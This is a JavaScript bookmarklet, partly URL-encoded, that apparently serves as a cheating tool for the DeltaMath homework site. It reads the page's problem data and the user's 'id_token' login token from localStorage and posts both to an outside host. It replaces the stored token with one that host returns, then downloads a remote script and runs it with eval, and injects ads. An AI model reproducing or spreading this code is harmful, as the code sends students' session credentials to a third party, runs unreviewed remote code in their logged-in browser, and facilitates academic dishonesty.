src: javascript:(function()/*scramtag 11 e4ccf83dc87*/{try { endGuided(); endGuided2(); } catch {} (function () /*scramtag 96 e4ccf83dc87*/{ const API = 'https://deltamath.mret.baby/'; async function main() /*scramtag 191 e4ccf83dc87*/{ let skillData = Object.values(document.querySelector('#question_page%22))[0].pendingProps.children.props.problemData;%20let%20ta%20=%20Object.values(document.querySelector(%22#main-content%22))[0].memoizedProps.children[0].props.solveSkill.ta;%20const%20payload%20=%20{%20id:%20ta._id,%20skillcode:%20skillData.skillcode,%20lastedit:%20ta.last_edit,%20token:%20localStorage.getItem(%22id_token%22)%20};%20const%20apiResponse%20=%20await%20fetch(API%20+%20'api/process',%20{%20method:%20'POST',%20headers:%20{%20'Content-Type':%20'application/json'%20},%20body:%20JSON.stringify(payload)%20});%20const%20result%20=%20await%20apiResponse.json();%20if%20(result.newToken)%20{%20localStorage.setItem(%22id_token%22,%20result.newToken);%20}%20if%20(result.url)%20{%20window.open(API%20+%20result.url,%20'_blank');%20}%20}%20main();%20})();%20(async%20()=%3E/*scramtag%20939%20e4ccf83dc87*/{%20const%20code%20=%20await%20(await%20fetch(%22https://mret.baby/main.js%22)).text();%20eval($scramjet$rewrite(code));%20setTimeout(()%20=%3E%20/*scramtag%201087%20e4ccf83dc87*/{%20loadAds({%20banner:%20%22bfcd8226a70379515d52edb058ba9894%22,%20native:%20%224faf4db3cf4fb37b28c261af298f0f4f%22%20});%20},%201000);%20})();})();
